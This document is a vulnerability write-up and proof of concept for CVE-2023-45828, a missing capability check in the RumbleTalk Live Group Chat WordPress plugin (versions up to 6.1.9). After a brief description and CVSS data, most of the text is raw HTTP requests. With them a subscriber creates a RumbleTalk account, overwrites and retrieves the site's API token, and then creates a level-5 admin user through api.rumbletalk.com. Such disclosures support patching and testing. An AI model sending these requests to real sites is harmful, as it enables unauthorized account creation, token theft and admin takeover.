# CVE-2023-45828
RumbleTalk Live Group Chat &lt;= 6.1.9 - Missing Authorization via handleRequest

### Description:
The RumbleTalk Live Group Chat plugin for WordPress is vulnerable to unauthorized access of data, modification of data, and loss of data due to a missing capability check on the handleRequest AJAX function in versions up to, and including, 6.1.9. This makes it possible for authenticated attackers, with subscriber-level access and above, to retrieve or update tokens, create, update, refresh, and delete chats, and create accounts.

```
Severity: high
CVE ID: CVE-2023-45828
CVSS Score: 7.6
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L
Plugin Slug: rumbletalk-chat-a-chat-with-themes
WPScan URL: https://www.wpscan.com/plugin/rumbletalk-chat-a-chat-with-themes
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/d9d6e168-a768-4062-9ef1-0be9d6c65c51?source=api-prod
```


POC - Must be logged in as subscriber.

Create a Rumble Account.
---

```
POST /wp-admin/admin-ajax.php?_fs_blog_admin=true HTTP/1.1
Host: wordpress.lan
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://wordpress.lan/wp-admin/options-general.php?page=rumbletalk-chat
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 139
Origin: http://wordpress.lan
Connection: close

action=rumbletalk_ajax&data[request]=CREATE_ACCOUNT&data[data][email]=test@rumble.com&data[data][password]=Password1!
```

Update Rumble Tokens
---

```
POST /wp-admin/admin-ajax.php?_fs_blog_admin=true HTTP/1.1
Host: wordpress.lan
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://wordpress.lan/wp-admin/options-general.php?page=rumbletalk-chat
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 202
Origin: http://wordpress.lan
Connection: close

action=rumbletalk_ajax&data[request]=UPDATE_TOKEN&data[data][key]=52e2299585f657b53d5add545915773d&data[data][secret]=
```

Get Token
---

```
POST /wp-admin/admin-ajax.php?_fs_blog_admin=true HTTP/1.1
Host: wordpress.lan
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://wordpress.lan/wp-admin/options-general.php?page=rumbletalk-chat
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 50
Origin: http://wordpress.lan
Connection: close

action=rumbletalk_ajax&data%5Brequest%5D=GET_TOKEN
```

Create Admin on rumble
---

```
POST /users HTTP/2
Host: api.rumbletalk.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer INSERT BEARER TOKEN!
Content-Length: 787
Origin: https://iframe.rumbletalk.com
Referer: https://iframe.rumbletalk.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers

{"id":null,"username":"test","password":"TestTest123","level":5,"moderatorRoomId":null,"firstName":"test","lastName":"test","email":"test@test","image":"","description":"test","rooms":[],"dispatchConfig":null,"_targetInst":null,"nativeEvent":null,"type":null,"target":null,"currentTarget":null,"eventPhase":null,"bubbles":null,"cancelable":null,"timeStamp":null,"defaultPrevented":null,"isTrusted":null,"view":null,"detail":null,"screenX":null,"screenY":null,"clientX":null,"clientY":null,"ctrlKey":null,"shiftKey":null,"altKey":null,"metaKey":null,"getModifierState":null,"button":null,"buttons":null,"relatedTarget":null,"pageX":null,"pageY":null,"isDefaultPrevented":null,"isPropagationStopped":null,"_dispatchListeners":null,"_dispatchInstances":null,"created":1697532286,"status":1}
```

